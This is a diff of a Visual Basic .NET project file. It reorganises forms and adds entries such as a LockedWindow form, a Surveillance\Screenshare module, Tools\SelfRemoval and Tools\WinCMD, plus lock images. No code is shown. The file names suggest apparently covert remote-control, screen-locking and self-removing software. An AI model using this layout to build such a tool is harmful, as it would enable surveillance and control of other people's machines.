@@ -89,12 +89,19 @@
     <Import Include="System.Threading.Tasks" />
   </ItemGroup>
   <ItemGroup>
-    <Compile Include="RemoteChat.Designer.vb">
-      <DependentUpon>RemoteChat.vb</DependentUpon>
+    <Compile Include="Forms\LockedWindow.Designer.vb">
+      <DependentUpon>LockedWindow.vb</DependentUpon>
     </Compile>
-    <Compile Include="RemoteChat.vb">
+    <Compile Include="Forms\LockedWindow.vb">
       <SubType>Form</SubType>
     </Compile>
+    <Compile Include="Forms\RemoteChat.Designer.vb">
+      <DependentUpon>RemoteChat.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\RemoteChat.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Initialization.vb" />
     <Compile Include="MainForm.vb">
       <SubType>Form</SubType>
     </Compile>
@@ -117,10 +124,17 @@
       <DependentUpon>Settings.settings</DependentUpon>
       <DesignTimeSharedInput>True</DesignTimeSharedInput>
     </Compile>
-    <Compile Include="Screenshare.vb" />
+    <Compile Include="Surveillance\Screenshare.vb" />
+    <Compile Include="IndependantActions.vb" />
+    <Compile Include="Tools\SelfRemoval.vb" />
+    <Compile Include="Tools\UIFeatures.vb" />
+    <Compile Include="Tools\WinCMD.vb" />
   </ItemGroup>
   <ItemGroup>
-    <EmbeddedResource Include="RemoteChat.resx">
+    <EmbeddedResource Include="Forms\LockedWindow.resx">
+      <DependentUpon>LockedWindow.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\RemoteChat.resx">
       <DependentUpon>RemoteChat.vb</DependentUpon>
     </EmbeddedResource>
     <EmbeddedResource Include="MainForm.resx">
@@ -159,7 +173,16 @@
     </BootstrapperPackage>
   </ItemGroup>
   <ItemGroup>
-    <None Include="Resources\donald.jpg" />
+    <None Include="Resources\lock_min.PNG" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\Image1.bmp" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\lock-min.jpg" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\psource.txt" />
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.VisualBasic.targets" />
 </Project>
